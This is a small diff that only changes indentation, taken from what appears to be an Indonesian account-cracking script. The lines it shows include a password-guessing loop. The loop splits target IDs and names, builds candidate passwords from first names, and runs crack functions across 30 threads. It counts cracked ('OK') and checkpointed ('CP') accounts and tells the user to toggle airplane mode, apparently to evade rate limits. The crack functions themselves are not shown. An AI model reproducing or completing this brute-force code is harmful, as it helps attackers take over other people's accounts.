@@ -938,7 +938,7 @@ def passwrd():
 	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !', style=f"bold purple"))
 	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !', style=f"bold purple"))
 	with prog:
-		with tred(max_workers=30) as pool:
+	     with tred(max_workers=30) as pool:
 		  for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
@@ -976,7 +976,7 @@ def passwrd():
 				pool.submit(crack2,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
-	    print('')
+	     print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
